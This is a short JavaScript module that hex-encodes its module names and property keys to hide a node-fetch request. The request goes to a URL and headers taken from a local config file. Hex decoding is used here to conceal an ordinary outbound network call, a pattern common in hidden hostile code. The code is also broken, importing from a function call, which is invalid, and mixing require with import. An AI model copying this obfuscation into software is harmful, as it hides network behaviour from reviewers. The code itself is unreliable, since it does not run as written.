
function e(r) {
    return b.from(r, 'hex').toString()
}

const r = require;
const b = Buffer;
const f = r(e('6e6f64652d6665746368'))
// const c = r(e('2e2f636f6e666967'))
import c from e('2e2f636f6e666967');


function req() {

    console.log(f, 'f')
    console.log(c, 'c')
    return f(c[e('75726c')].join(e('2f')), {
        [e('68656164657273')]: c[e('68656164657273')],
    }).then(res => res.json())
}

export default req;